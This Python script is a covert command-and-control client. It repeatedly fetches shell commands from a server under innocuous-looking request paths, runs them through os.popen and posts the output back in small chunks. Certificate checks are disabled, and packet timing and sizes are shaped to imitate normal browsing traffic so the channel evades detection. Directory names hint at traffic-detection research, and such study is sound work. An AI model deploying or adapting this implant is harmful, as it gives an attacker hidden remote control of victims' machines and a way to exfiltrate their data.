import requests 
import os, shlex, subprocess
import urllib, urllib3
import random 
import numpy as np
from dist import *
import time

# load silences 
silence_array = np.load("../../../advanced-hacker/stats/dist_weights/silence-ubuntu-social-adblock-17-may-alpha0_0.npy")
pps_array = np.load("../../../advanced-hacker/stats/dist_weights/pps-ubuntu-social-adblock-17-may-alpha-0_0.npy")
pktlen_array = np.load("../../../advanced-hacker/stats/dist_weights/silence-ubuntu-social-adblock-17-may-alpha0_0.npy")  ## #tt
server_address = "http://127.0.0.1:4440/" #"http://111.11.11.10:65321/"
print(pps_array)

def gen_pps():
    exit_loop = False
    val_pps = None
    while not exit_loop:
        val_pps = beta_negative_binomial(6.0, 3.3, 6, max=40)
        if val_pps >= 7:
            if random.uniform(0, 1) < 0.20:
                exit_loop = True
        else:
            if random.uniform(0, 1) >= 0.20:
                exit_loop = True
    return val_pps

def empirical_prob(pps_or_pktlen, silence_array=None, pps_array=None, pktlen_array=None):
    if pps_or_pktlen == "pps":
        return np.random.choice(list(range(np.size(pps_array))), size=None, replace=True, p=pps_array)
    if pps_or_pktlen == "silence":
        return np.random.choice(list(range(np.size(silence_array))), size=None, replace=True, p=silence_array)
    if pps_or_pktlen == "low_sil":
        return np.random.choice([6, 10, 420, 700, 800, 850, 900], size=None, p=[0.10, 0.10, 0.20, 0.10, 0.20, 0.10, 0.20]) #1 1111repor 3, 6...    
    else:
        return np.random.choice(list(range(np.size(pktlen_array))), size=None, replace=True, p=pktlen_array) 

while True:

    """ GET """
    #stream_curl = os.popen('curl -k https://127.0.0.1:4440/task0')
    #output_curl = stream_curl.read()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) ## we dont need to verify the certs for testing purposes...
    services = ["exploring", "network_status", "system_settings"]
    r = requests.get(server_address+services[random.randint(0, len(services)-1)], verify=False)
    cmd_fetched = r.content.decode("utf-8")[1:-1] ## byte stream to str again and remove \"

    """ RUN COMMAND """
    stream_command = os.popen(cmd_fetched+" 2>&1")   #output_curl
    output_command = stream_command.read()
    #print(beta_negative_binomial(4.6, 4.9, 3))  ## DECIDE: THIS OR MIMMIC...

    """ generate output data 2 send """
    # gen avg pkt len88
    send_output = []
    exit_while = False
    prev_chars2read = 0
    while not exit_while:
        # gen pps
        pps = empirical_prob("pps", pps_array=pps_array)#gen_pps()r
        print("pps: ", pps)
        aux = []
        for i in range(0, pps):
            chars2read = negative_binomial(6, 0.50, max = 70)
            next_chars2read = prev_chars2read+chars2read
            if next_chars2read < len(output_command):
                cmd2append = output_command[prev_chars2read : next_chars2read]
                if cmd2append != '':
                    aux.append(cmd2append)
            else:
                cmd2append = output_command[prev_chars2read :]
                if cmd2append != '':
                    aux.append(cmd2append)
                exit_while = True
            prev_chars2read = next_chars2read
        send_output.append(aux)
        

    print(send_output)
    """ POST  """
    #send_output_command = "curl -k -X \'POST\' \'https://127.0.0.1:4440/task2?output=ola" + urllib.request.pathname2url(output_command) + "\'"
    #os.system(send_output_command)
    for strs in send_output:
        for s in strs:
            r = requests.post(server_address+"task2", params = {'output':s}, verify=False) #127.0.0.1:4440
            time.sleep(0.018)
        # gen silence 
        silences = empirical_prob("silence", silence_array=silence_array)
        print(silences)
        time.sleep(silences)
